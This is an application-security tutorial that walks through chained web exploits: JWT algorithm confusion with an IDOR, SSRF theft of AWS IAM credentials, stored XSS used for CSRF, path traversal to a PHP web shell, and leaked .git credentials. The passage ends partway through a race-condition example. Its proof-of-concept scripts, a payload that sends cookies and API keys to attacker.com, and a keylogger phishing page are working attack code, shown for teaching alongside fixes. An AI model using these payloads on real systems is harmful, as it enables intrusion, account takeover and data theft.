# Security Deep Dive Part 15: Chaining Vulnerabilities Together -- From Low-Severity Bugs to Full Compromise

---

**Series:** Application Security Deep Dive -- A Practitioner's Guide from Recon to Exploitation
**Part:** 15 (Vulnerability Chaining)
**Audience:** Bug bounty hunters, penetration testers, security researchers, and developers who understand HTTP, Burp Suite, and modern web stacks
**Reading time:** ~55 minutes

**Meta Description:** Master the art of chaining multiple vulnerabilities into high-impact attack chains. Ten complete exploitation walkthroughs combining IDOR, JWT manipulation, SSRF, XSS, CSRF, file upload, source code disclosure, race conditions, SQL injection, OAuth flaws, CORS misconfigurations, and subdomain takeover. Includes Burp Suite workflows, real HTTP requests, code examples, and bug bounty report templates.

**Slug:** security-deep-dive-chaining-vulnerabilities-together

**Keywords:** vulnerability chaining, chained exploits, IDOR JWT chain, SSRF AWS metadata, XSS CSRF chain, file upload web shell, source code disclosure credential reuse, race condition payment bypass, SQL injection account takeover, OAuth open redirect, CORS misconfiguration exploit, subdomain takeover cookie theft, bug bounty chaining, penetration testing attack chains, severity escalation

---

## Introduction

A single vulnerability is a finding. A chain of vulnerabilities is a compromise.

The difference between a $500 bounty and a $50,000 bounty is almost never the individual severity of any single bug. It is the attacker's ability to link multiple low and medium severity findings into an attack chain that demonstrates catastrophic impact. An IDOR that leaks user emails is Medium. That same IDOR chained with a JWT algorithm confusion attack that lets you forge admin tokens turns into Critical. An SSRF that can reach internal hosts is High. That SSRF chained with AWS metadata access and IAM credential theft that lets you exfiltrate an entire S3 bucket is a headline-making breach.

The security industry has a term for this: **attack path analysis**. It is the practice of mapping how an attacker moves from an initial low-privilege position to full compromise by chaining together individually modest vulnerabilities. Every major breach in history followed a chain. The 2017 Equifax breach chained an unpatched Struts vulnerability with poor network segmentation and excessive database permissions. The 2020 SolarWinds attack chained a supply chain compromise with SAML token forgery and lateral movement through Azure AD.

This article presents ten complete vulnerability chains, each written as a full attack narrative with step-by-step exploitation, HTTP requests, Burp Suite workflows, code examples showing the vulnerable applications, and impact analysis. Each chain starts from an initial finding and escalates through multiple steps to a high-impact outcome.

This is not theoretical. These are patterns that appear on real bug bounty programs, real penetration tests, and real breaches every single day.

---

## Chain 1: IDOR + JWT Manipulation -- Escalating from User to Admin

### The Scenario

A SaaS application uses JWTs for authentication. The JWT contains a `role` field. The application has an IDOR vulnerability in its user profile endpoint that leaks user data including role information. The JWT uses an `alg` field that the server does not properly validate, allowing algorithm confusion attacks.

### Step 1: Discover the IDOR

After creating a normal user account, you discover that the `/api/users/:id` endpoint does not properly validate authorization:

```http
GET /api/users/1 HTTP/1.1
Host: app.target.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

Response (you are user ID 47, but you can access user ID 1):

```json
{
  "id": 1,
  "email": "admin@target.com",
  "name": "System Administrator",
  "role": "super_admin",
  "created_at": "2024-01-15T00:00:00Z",
  "last_login": "2026-03-30T14:22:00Z",
  "mfa_enabled": false,
  "department": "engineering"
}
```

**Finding 1:** IDOR on `/api/users/:id` -- any authenticated user can read any other user's profile, including role and MFA status. On its own, this is Medium severity (information disclosure).

### Step 2: Analyze the JWT

Decode your JWT (from the `Authorization` header):

```json
// Header
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-1"
}

// Payload
{
  "sub": 47,
  "email": "attacker@example.com",
  "role": "user",
  "iat": 1711800000,
  "exp": 1711886400
}
```

The JWT is signed with RS256 (RSA). The server's public key might be available at a standard endpoint:

```http
GET /.well-known/jwks.json HTTP/1.1
Host: app.target.com
```

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "key-1",
      "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM...",
      "e": "AQAB",
      "use": "sig"
    }
  ]
}
```

### Step 3: JWT Algorithm Confusion Attack

The vulnerable server code accepts both RS256 and HS256:

```javascript
// Vulnerable JWT verification (Node.js)
const jwt = require('jsonwebtoken');

function verifyToken(token) {
  // BUG: algorithms array includes both RSA and HMAC
  // When alg=HS256 is received, the server uses the RSA public key
  // as the HMAC secret
  const publicKey = fs.readFileSync('/app/keys/public.pem');
  return jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] });
}
```

The attack: convert the RSA public key to be used as an HMAC secret, then sign a forged token:

```python
#!/usr/bin/env python3
"""Chain 1 PoC: IDOR + JWT algorithm confusion -> admin access"""

import jwt
import json
import requests

TARGET = "https://app.target.com"
ATTACKER_TOKEN = "eyJhbGciOiJSUzI1NiIs..."  # Your legitimate user token

# Step 1: Exploit IDOR to discover admin user details
print("[*] Step 1: Exploiting IDOR to enumerate admin users")
headers = {"Authorization": f"Bearer {ATTACKER_TOKEN}"}

for user_id in range(1, 20):
    resp = requests.get(f"{TARGET}/api/users/{user_id}", headers=headers)
    if resp.status_code == 200:
        user = resp.json()
        if user.get("role") in ("admin", "super_admin"):
            print(f"[+] Found admin: ID={user['id']}, email={user['email']}, role={user['role']}")

# Step 2: Get the public key
print("[*] Step 2: Fetching public key")
jwks_resp = requests.get(f"{TARGET}/.well-known/jwks.json")
# Convert JWK to PEM format (simplified)
public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0vx7agoebGcQSuuPiLJX
ZptN9nndrQmbXEps2aiAFbWhM...
-----END PUBLIC KEY-----"""

# Step 3: Forge admin JWT using algorithm confusion
print("[*] Step 3: Forging admin JWT with HS256 algorithm confusion")
forged_payload = {
    "sub": 1,                          # Admin user ID from IDOR
    "email": "admin@target.com",       # Admin email from IDOR
    "role": "super_admin",             # Admin role from IDOR
    "iat": 1711800000,
    "exp": 1711886400
}

# Sign with HS256 using the RSA public key as the HMAC secret
forged_token = jwt.encode(
    forged_payload,
    public_key_pem,
    algorithm="HS256"
)

print(f"[+] Forged token: {forged_token[:50]}...")

# Step 4: Use forged token to access admin functionality
print("[*] Step 4: Accessing admin endpoints with forged token")
admin_headers = {"Authorization": f"Bearer {forged_token}"}

# Access admin dashboard
resp = requests.get(f"{TARGET}/api/admin/dashboard", headers=admin_headers)
print(f"[+] Admin dashboard: HTTP {resp.status_code}")

# List all users with full details
resp = requests.get(f"{TARGET}/api/admin/users?include=all", headers=admin_headers)
print(f"[+] All users: HTTP {resp.status_code}, {len(resp.json().get('users', []))} users")

# Modify another user's role
resp = requests.patch(
    f"{TARGET}/api/admin/users/47",
    headers=admin_headers,
    json={"role": "super_admin"}
)
print(f"[+] Role escalation: HTTP {resp.status_code}")
```

### Burp Suite Workflow

1. **Discover IDOR**: In Repeater, modify the user ID in `/api/users/1` through `/api/users/100`. Use Intruder with a numeric payload list for efficiency. Note any responses with different role values.
2. **Extract JWT**: In Proxy history, copy your JWT from the Authorization header. Use the **JWT Editor** Burp extension to decode it.
3. **Fetch public key**: Send a request to `/.well-known/jwks.json` or `/certs`. Import into JWT Editor.
4. **Forge token**: In JWT Editor, change the algorithm to HS256, modify the payload to use the admin's `sub` and `role`, and sign with the RSA public key as HMAC secret.
5. **Test admin access**: Replace the Authorization header in Repeater with the forged token. Try admin endpoints discovered from Swagger docs or JavaScript source maps.

### Impact

- **Individual IDOR**: Medium -- information disclosure of user profiles
- **Individual JWT issue**: Medium -- algorithm confusion requires specific conditions
- **Chained together**: Critical -- full admin account takeover, ability to read/modify all user data, escalate privileges for any user, access administrative functions

---

## Chain 2: SSRF + AWS Metadata Access -- Stealing IAM Credentials to Access S3

### The Scenario

A web application has a URL preview feature that fetches external URLs and displays a preview. This feature is vulnerable to SSRF. The application runs on AWS EC2 with an IAM role that has S3 access.

### Step 1: Discover the SSRF

The application has a link preview endpoint:

```http
POST /api/link-preview HTTP/1.1
Host: app.target.com
Content-Type: application/json
Authorization: Bearer <user_token>

{
  "url": "https://example.com"
}
```

Normal response:

```json
{
  "title": "Example Domain",
  "description": "This domain is for use in illustrative examples...",
  "image": null,
  "url": "https://example.com"
}
```

Test for SSRF by pointing to an internal resource:

```http
POST /api/link-preview HTTP/1.1
Host: app.target.com
Content-Type: application/json
Authorization: Bearer <user_token>

{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

Response:

```json
{
  "title": "",
  "description": "ami-id\nami-launch-index\nami-manifest-path\nhostname\niam\ninstance-id\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nnetwork\nplacement\nprofile\nreservation-id\nsecurity-groups",
  "image": null,
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

The SSRF is confirmed -- the application fetched the AWS metadata endpoint and returned its contents.

### Step 2: Extract IAM Credentials

```http
POST /api/link-preview HTTP/1.1
Host: app.target.com
Content-Type: application/json
Authorization: Bearer <user_token>

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

Response reveals the IAM role name:

```json
{
  "title": "",
  "description": "prod-app-ec2-role",
  "image": null,
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

Now fetch the actual credentials:

```http
POST /api/link-preview HTTP/1.1
Host: app.target.com
Content-Type: application/json
Authorization: Bearer <user_token>

{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-app-ec2-role"
}
```

Response:

```json
{
  "title": "",
  "description": "{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2026-03-30T14:00:00Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"ASIAXXXXXXXXXEXAMPLE\",\n  \"SecretAccessKey\" : \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\" : \"IQoJb3JpZ2luX2VjEBAaCXVzLWVhc3QtMSJHME...\",\n  \"Expiration\" : \"2026-03-30T20:00:00Z\"\n}",
  "image": null,
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-app-ec2-role"
}
```

### Step 3: Use Stolen Credentials to Access S3

```bash
# Configure AWS CLI with stolen temporary credentials
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXEXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEBAaCXVzLWVhc3QtMSJHME..."

# Verify identity
aws sts get-caller-identity
# {
#   "UserId": "AROA...:i-0a1b2c3d4e5f6g7h8",
#   "Account": "123456789012",
#   "Arn": "arn:aws:sts::123456789012:assumed-role/prod-app-ec2-role/i-0a1b2c3d4e5f6g7h8"
# }

# List S3 buckets
aws s3 ls
# 2024-01-15 target-user-uploads
# 2024-03-20 target-internal-data
# 2024-06-10 target-database-backups

# List contents of internal data bucket
aws s3 ls s3://target-internal-data/
# PRE config/
# PRE exports/
# PRE reports/
# 2026-03-15 14:22:01  customer_data_export_2026.csv

# Download sensitive data (in a real bounty, you STOP here and report)
# Just verify access exists:
aws s3api head-object --bucket target-internal-data --key customer_data_export_2026.csv
# {
#   "ContentLength": 234567890,
#   "ContentType": "text/csv",
#   "LastModified": "2026-03-15T14:22:01Z"
# }

# Check for database backups
aws s3 ls s3://target-database-backups/
# 2026-03-30 02:00:00  prod-db-backup-2026-03-30.sql.gz
```

### The Vulnerable Code

```javascript
// Vulnerable link preview endpoint (Node.js/Express)
const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');

const app = express();
app.use(express.json());

app.post('/api/link-preview', async (req, res) => {
  const { url } = req.body;
  
  // BUG 1: No URL validation -- allows internal IPs and cloud metadata
  // BUG 2: No allowlist of permitted protocols/hosts
  // BUG 3: Response body returned to client without sanitization
  
  try {
    const response = await axios.get(url, { timeout: 5000 });
    const $ = cheerio.load(response.data);
    
    res.json({
      title: $('title').text() || '',
      description: $('meta[name="description"]').attr('content') || response.data.substring(0, 500),
      image: $('meta[property="og:image"]').attr('content') || null,
      url: url
    });
  } catch (error) {
    res.status(400).json({ error: 'Failed to fetch URL' });
  }
});
```

**Fixed version:**

```javascript
const { URL } = require('url');
const dns = require('dns').promises;
const ipaddr = require('ipaddr.js');

async function isInternalUrl(urlString) {
  try {
    const parsed = new URL(urlString);
    
    // Block non-HTTP protocols
    if (!['http:', 'https:'].includes(parsed.protocol)) return true;
    
    // Block cloud metadata IPs
    const blockedHosts = ['169.254.169.254', 'metadata.google.internal', '100.100.100.200'];
    if (blockedHosts.includes(parsed.hostname)) return true;
    
    // Resolve DNS and check if it points to internal IP
    const addresses = await dns.resolve4(parsed.hostname);
    for (const addr of addresses) {
      const parsedIp = ipaddr.parse(addr);
      if (parsedIp.range() !== 'unicast') return true; // Blocks private, loopback, link-local
    }
    
    return false;
  } catch {
    return true; // Block on any parsing error
  }
}

app.post('/api/link-preview', async (req, res) => {
  const { url } = req.body;
  
  if (await isInternalUrl(url)) {
    return res.status(400).json({ error: 'URL not allowed' });
  }
  
  // ... rest of the handler with timeout and response size limits
});
```

### Burp Suite Workflow

1. **Identify the SSRF vector**: In Proxy history, find requests that include a URL parameter. Test with Burp Collaborator: `{"url": "http://BURP_COLLABORATOR_URL"}`. If you get a DNS lookup and HTTP request from the target server's IP, SSRF is confirmed.
2. **Map internal access**: Use Intruder to test internal IP ranges through the SSRF. Payload list of internal IPs: `127.0.0.1`, `10.0.0.1`, `172.16.0.1`, `192.168.1.1`, `169.254.169.254`.
3. **Extract metadata**: Manually walk the AWS metadata API tree through the SSRF endpoint in Repeater.
4. **Validate credentials**: Use the extracted credentials with AWS CLI outside of Burp.

### IMDSv2 Bypass Considerations

AWS IMDSv2 requires a PUT request to get a session token before accessing metadata. Most SSRF vulnerabilities only allow GET requests, which blocks this chain. However:

```http
# If the SSRF follows redirects, you might chain through a redirect service
# that converts GET -> PUT. This is rare but has been demonstrated.

# Check if IMDSv1 is still enabled (it often is for backward compatibility):
POST /api/link-preview HTTP/1.1
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/"}

# If this works, IMDSv1 is enabled and the chain succeeds as described.
```

### Impact

- **Individual SSRF**: High -- can reach internal network
- **Chained with AWS metadata**: Critical -- IAM credential theft, access to S3 buckets containing customer data, potential access to other AWS services (RDS, Lambda, Secrets Manager)

---

## Chain 3: XSS + CSRF -- Using Stored XSS to Perform CSRF Actions as Victim

### The Scenario

A project management application has stored XSS in the comment field on project tasks. The application has CSRF protection (SameSite cookies + CSRF tokens), but since the XSS executes within the application's origin, it can bypass all CSRF defenses.

### Step 1: Discover Stored XSS

The task comment endpoint does not sanitize HTML:

```http
POST /api/projects/15/tasks/42/comments HTTP/1.1
Host: app.target.com
Content-Type: application/json
Authorization: Bearer <attacker_token>
X-CSRF-Token: abc123

{
  "body": "Great work on this! <img src=x onerror=alert(document.domain)>"
}
```

When any user views the task, the XSS fires in their browser context.

### Step 2: Weaponize the XSS to Perform CSRF

The XSS executes in the same origin, so it can:
- Read CSRF tokens from the DOM or cookies
- Make authenticated API requests using the victim's session
- Read responses from those requests (same-origin)

The attack payload, injected as a comment:

```http
POST /api/projects/15/tasks/42/comments HTTP/1.1
Host: app.target.com
Content-Type: application/json
Authorization: Bearer <attacker_token>
X-CSRF-Token: abc123

{
  "body": "Can someone review this? <img src=x onerror=\"eval(atob('BASE64_ENCODED_PAYLOAD'))\">"
}
```

The base64-decoded payload:

```javascript
// XSS payload that performs CSRF actions as the victim
(async function() {
  // Step A: Get CSRF token from the page (it's in a meta tag)
  const csrfToken = document.querySelector('meta[name=csrf-token]').getAttribute('content');
  
  // Step B: Get victim's user info
  const userResp = await fetch('/api/me', {
    credentials: 'include',
    headers: { 'X-CSRF-Token': csrfToken }
  });
  const user = await userResp.json();
  
  // Step C: If victim is an admin, add attacker as admin
  if (user.role === 'admin' || user.role === 'owner') {
    await fetch('/api/projects/15/members', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken
      },
      body: JSON.stringify({
        email: 'attacker@evil.com',
        role: 'admin'
      })
    });
  }
  
  // Step D: Extract all project API keys
  const keysResp = await fetch('/api/projects/15/api-keys', {
    credentials: 'include',
    headers: { 'X-CSRF-Token': csrfToken }
  });
  const keys = await keysResp.json();
  
  // Step E: Exfiltrate data to attacker's server
  const img = new Image();
  img.src = 'https://attacker.com/collect?data=' + btoa(JSON.stringify({
    user: user,
    apiKeys: keys,
    cookies: document.cookie
  }));
  
  // Step F: Change the victim's email to attacker's email (account takeover)
  await fetch('/api/me/email', {
    method: 'PUT',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken
    },
    body: JSON.stringify({
      email: 'attacker-takeover@evil.com'
    })
  });
  
  // Step G: Trigger password reset for the new email
  await fetch('/api/auth/reset-password', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: 'attacker-takeover@evil.com'
    })
  });
})();
```

### The Vulnerable Code

```javascript
// Vulnerable comment rendering (React component)
function TaskComment({ comment }) {
  // BUG: dangerouslySetInnerHTML without sanitization
  return (
    <div className="comment">
      <span className="author">{comment.author}</span>
      <div
        className="comment-body"
        dangerouslySetInnerHTML={{ __html: comment.body }}
      />
    </div>
  );
}

// Vulnerable backend -- no HTML sanitization on input
app.post('/api/projects/:projectId/tasks/:taskId/comments', async (req, res) => {
  const { body } = req.body;
  // No sanitization -- stores raw HTML
  const comment = await Comment.create({
    body: body,  // Stored as-is
    taskId: req.params.taskId,
    authorId: req.user.id
  });
  res.json(comment);
});
```

**Fixed version:**

```javascript
// Backend: Sanitize on input
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

app.post('/api/projects/:projectId/tasks/:taskId/comments', async (req, res) => {
  const { body } = req.body;
  const sanitizedBody = DOMPurify.sanitize(body, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target'],
    ALLOW_DATA_ATTR: false
  });
  
  const comment = await Comment.create({
    body: sanitizedBody,
    taskId: req.params.taskId,
    authorId: req.user.id
  });
  res.json(comment);
});

// Frontend: Use sanitized HTML or a markdown renderer
function TaskComment({ comment }) {
  // Even with backend sanitization, defense in depth:
  const cleanHtml = DOMPurify.sanitize(comment.body);
  return (
    <div className="comment">
      <span className="author">{comment.author}</span>
      <div
        className="comment-body"
        dangerouslySetInnerHTML={{ __html: cleanHtml }}
      />
    </div>
  );
}
```

### Burp Suite Workflow

1. **Discover XSS**: Test comment fields with `<img src=x onerror=alert(1)>`. Check if the HTML is rendered unescaped in the response when viewing the task.
2. **Confirm stored XSS**: Post the comment, then view the task page in your browser through Burp Proxy. Check if the alert fires.
3. **Build the CSRF chain**: In Repeater, identify the CSRF token mechanism. Map out the admin API endpoints you want to target.
4. **Test the full chain**: Create a second browser profile (the "victim"). Log in as the victim. Navigate to the task with the XSS payload. Observe in Burp Proxy that the victim's browser makes the CSRF requests to admin endpoints.

### Impact

- **Individual stored XSS**: Medium to High -- script execution in victims' browsers
- **Chained with CSRF**: Critical -- account takeover, privilege escalation, data exfiltration, all automated and triggered simply by the victim viewing a page

---

## Chain 4: File Upload + Path Traversal -- Uploading a Web Shell to an Arbitrary Location

### The Scenario

A document management application allows users to upload files. The upload function has a path traversal vulnerability in the filename parameter, allowing the attacker to write files to arbitrary locations on the server.

### Step 1: Analyze the Upload Mechanism

Normal file upload:

```http
POST /api/documents/upload HTTP/1.1
Host: app.target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Authorization: Bearer <user_token>

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="report.pdf"
Content-Type: application/pdf

%PDF-1.4 ...file contents...
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="folder"
Content-Type: text/plain

/documents/reports
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Response:

```json
{
  "id": 156,
  "filename": "report.pdf",
  "path": "/documents/reports/report.pdf",
  "size": 45230,
  "url": "/files/documents/reports/report.pdf"
}
```

### Step 2: Test Path Traversal in Filename

```http
POST /api/documents/upload HTTP/1.1
Host: app.target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Authorization: Bearer <user_token>

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="../../../test.txt"
Content-Type: text/plain

path traversal test
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="folder"
Content-Type: text/plain

/documents
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Response:

```json
{
  "id": 157,
  "filename": "test.txt",
  "path": "/documents/../../../test.txt",
  "size": 20,
  "url": "/files/test.txt"
}
```

Verify the file was written outside the intended directory:

```http
GET /test.txt HTTP/1.1
Host: app.target.com
```

If you get your content back, the path traversal works.

### Step 3: Upload a Web Shell

The application is running on a Node.js server, but there is an Nginx instance in front serving static files. If the server also has PHP-FPM configured (common in shared hosting or legacy setups), you can upload a PHP web shell:

```http
POST /api/documents/upload HTTP/1.1
Host: app.target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Authorization: Bearer <user_token>

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="../../../../../../var/www/html/cmd.php"
Content-Type: application/pdf

<?php
if(isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd'] . ' 2>&1');
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}
?>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="folder"
Content-Type: text/plain

/documents
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Notice the `Content-Type: application/pdf` -- the server might check this header but not the actual file content.

### Step 4: Execute Commands

```http
GET /cmd.php?cmd=id HTTP/1.1
Host: app.target.com
```

Response:

```html
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

```http
GET /cmd.php?cmd=cat%20/etc/passwd HTTP/1.1
Host: app.target.com
```

For a Node.js-only environment without PHP, the attacker can target overwriting application files:

```http
POST /api/documents/upload HTTP/1.1
Host: app.target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Authorization: Bearer <user_token>

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="../../../../../../var/www/app/public/evil.html"
Content-Type: text/html

<html>
<body>
<script>
// Keylogger or credential harvester
document.addEventListener('keypress', function(e) {
  new Image().src = 'https://attacker.com/log?key=' + e.key;
});
</script>
<h1>Session expired. Please log in again.</h1>
<form action="https://attacker.com/phish" method="POST">
  <input name="email" placeholder="Email">
  <input name="password" type="password" placeholder="Password">
  <button type="submit">Log In</button>
</form>
</body>
</html>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

### The Vulnerable Code

```javascript
// Vulnerable upload handler (Node.js/Express)
const multer = require('multer');
const path = require('path');

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const folder = req.body.folder || '/documents';
    const uploadPath = path.join('/var/www/app/uploads', folder);
    cb(null, uploadPath);
  },
  filename: (req, file, cb) => {
    // BUG: Uses original filename without sanitization
    cb(null, file.originalname);
  }
});

const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    // BUG: Only checks Content-Type header, not actual file content
    const allowed = ['application/pdf', 'image/png', 'image/jpeg', 'text/plain'];
    if (allowed.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'));
    }
  }
});

app.post('/api/documents/upload', upload.single('file'), (req, res) => {
  res.json({
    filename: req.file.filename,
    path: req.file.path,
    size: req.file.size
  });
});
```

**Fixed version:**

```javascript
const crypto = require('crypto');
const { fileTypeFromBuffer } = require('file-type');

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // Fixed: Always use the same upload directory, ignore user input
    cb(null, '/var/www/app/uploads/documents');
  },
  filename: (req, file, cb) => {
    // Fixed: Generate random filename, preserve only the validated extension
    const ext = path.extname(file.originalname).toLowerCase();
    const allowedExts = ['.pdf', '.png', '.jpg', '.jpeg', '.txt'];
    if (!allowedExts.includes(ext)) {
      return cb(new Error('Invalid file extension'));
    }
    const randomName = crypto.randomBytes(32).toString('hex');
    cb(null, `${randomName}${ext}`);
  }
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limit
});

app.post('/api/documents/upload', upload.single('file'), async (req, res) => {
  // Additional check: Verify actual file content matches claimed type
  const fileBuffer = require('fs').readFileSync(req.file.path);
  const detectedType = await fileTypeFromBuffer(fileBuffer);
  
  const allowedMimes = ['application/pdf', 'image/png', 'image/jpeg'];
  if (!detectedType || !allowedMimes.includes(detectedType.mime)) {
    require('fs').unlinkSync(req.file.path); // Delete the uploaded file
    return res.status(400).json({ error: 'Invalid file content' });
  }
  
  res.json({
    id: crypto.randomUUID(),
    filename: req.file.filename, // Randomized name, not original
    size: req.file.size
  });
});
```

### Impact

- **Individual path traversal**: Medium -- can write files to arbitrary locations
- **Individual file upload bypass**: Medium -- can upload files with unexpected content types
- **Chained together**: Critical -- remote code execution via web shell, full server compromise

---

## Chain 5: Source Code Disclosure + Credential Reuse -- Finding DB Credentials in Exposed .git

### The Scenario

During reconnaissance on a target's subdomain, you discover an exposed `.git` directory. The reconstructed source code contains database credentials in a configuration file. These credentials work on the production database because the developer reused the same password.

### Step 1: Discover .git Exposure

During subdomain enumeration and content discovery:

```bash
# Subdomain enumeration found staging.target.com
subfinder -d target.com -o subdomains.txt

# Content discovery on the staging subdomain
ffuf -u https://staging.target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,403
```

Result includes `/.git/HEAD` returning HTTP 200.

### Step 2: Dump the Repository

```bash
git-dumper https://staging.target.com/.git/ staging-source
cd staging-source
```

### Step 3: Search for Credentials

```bash
# Check current files
grep -rn "password\|secret\|key\|token\|credential" . \
  --include="*.js" --include="*.json" --include="*.env" \
  --include="*.yml" --include="*.yaml" --include="*.py" \
  --include="*.conf" --include="*.cfg"
```

Found in `config/database.js`:

```javascript
// config/database.js
module.exports = {
  development: {
    host: 'localhost',
    port: 5432,
    database: 'target_dev',
    username: 'dev_user',
    password: 'dev_password_123'
  },
  staging: {
    host: 'staging-db.internal.target.com',
    port: 5432,
    database: 'target_staging',
    username: 'staging_user',
    password: 'Stg_DB_2026!SecurePass'
  },
  production: {
    host: 'prod-db.internal.target.com',
    port: 5432,
    database: 'target_prod',
    username: 'prod_user',
    password: 'Pr0d_DB_2026!SecurePass'  // Note the pattern similarity
  }
};
```

### Step 4: Check Git History for Deleted Secrets

```bash
# Check for deleted files that might have had credentials
git log --all --diff-filter=D --summary | grep -i "env\|secret\|key\|credential\|config"

# Found: delete mode 100644 .env.production
# Restore it:
git log --all -- .env.production
# commit a1b2c3d4 - "remove production env file"

git show a1b2c3d4^:.env.production
```

Output:

```
DATABASE_URL=postgresql://prod_admin:Pr0d_Adm1n_M@ster_2026@prod-db.target.com:5432/target_prod
REDIS_URL=redis://:R3dis_Pr0d_2026@prod-cache.target.com:6379
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
JWT_SECRET=xK9mP2vL5nQ8wR_jwt_signing_2026
SMTP_PASSWORD=smtp_relay_password_2026
```

### Step 5: Verify Credential Access

The database hostname `prod-db.target.com` resolves to a public IP (cloud database with IP allowlisting that includes the staging server's IP range). Or the attacker uses the SSRF from Chain 2 to reach the internal database.

```bash
# If the database is publicly accessible (misconfigured security group):
psql "postgresql://prod_admin:Pr0d_Adm1n_M@ster_2026@prod-db.target.com:5432/target_prod"

target_prod=> \dt
              List of relations
 Schema |      Name       | Type  |   Owner
--------+-----------------+-------+-----------
 public | users           | table | prod_admin
 public | orders          | table | prod_admin
 public | payment_methods | table | prod_admin
 public | api_keys        | table | prod_admin
 public | sessions        | table | prod_admin

target_prod=> SELECT count(*) FROM users;
  count
---------
 2847591

target_prod=> SELECT email, role FROM users WHERE role = 'admin' LIMIT 5;
         email          |   role
------------------------+----------
 admin@target.com       | admin
 john.cto@target.com    | admin
 ops-team@target.com    | admin
```

### Impact

- **Individual .git exposure**: Medium -- source code disclosure on staging subdomain
- **Chained with credential reuse**: Critical -- production database access, full read/write access to all user data, payment information, and API keys

---

## Chain 6: Race Condition + Payment Manipulation -- Double-Spending via Concurrent Checkout

### The Scenario

An e-commerce application has a wallet/credits system. Users can apply a discount coupon during checkout. The coupon application endpoint has a race condition -- if multiple requests arrive simultaneously, the coupon is applied multiple times before the "already used" check completes.

### Step 1: Understand the Payment Flow

Normal checkout flow:

```http
# 1. Add items to cart
POST /api/cart/add HTTP/1.1
Content-Type: application/json
Authorization: Bearer <user_token>

{"product_id": 42, "quantity": 1}

# 2. Apply coupon (50% off, one-time use)
POST /api/cart/apply-coupon HTTP/1.1
Content-Type: application/json
Authorization: Bearer <user_token>

{"coupon_code": "HALFOFF50"}

# Response:
# {"discount": 50.00, "total": 50.00, "original_total": 100.00}

# 3. Checkout
POST /api/checkout HTTP/1.1
Content-Type: application/json
Authorization: Bearer <user_token>

{"payment_method": "wallet"}
```

### Step 2: Identify the Race Condition

The vulnerable coupon application code:

```javascript
// Vulnerable coupon application (Node.js/Express)
app.post('/api/cart/apply-coupon', async (req, res) => {
  const { coupon_code } = req.body;
  const userId = req.user.id;
  
  // Step A: Check if coupon is valid
  const coupon = await Coupon.findOne({ where: { code: coupon_code, active: true } });
  if (!coupon) return res.status(400).json({ error: 'Invalid coupon' });
  
  // Step B: Check if user already used this coupon
